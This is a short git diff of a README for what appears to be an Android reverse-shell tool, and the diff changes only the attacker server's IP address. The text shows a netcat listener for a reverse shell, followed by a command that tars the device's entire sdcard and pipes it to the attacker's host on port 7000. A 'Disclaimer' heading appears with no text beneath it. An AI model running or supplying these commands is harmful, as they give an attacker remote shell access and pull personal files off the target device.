@@ -1,7 +1,7 @@
 # How to use it simple way
 
 ## Get reverse shell
-In server (10.7.2.108):
+In server (192.168.1.65):
 
 ```bash
 netcat -nlvp 4444
@@ -21,7 +21,7 @@ In the reverse shell you do the following to start the process of transfering al
 
 ```bash
 cd sdcard
-tar -c * | nc 10.7.2.108 7000
+tar -c * | nc 192.168.1.65 7000
 ```
 
 ### Disclaimer
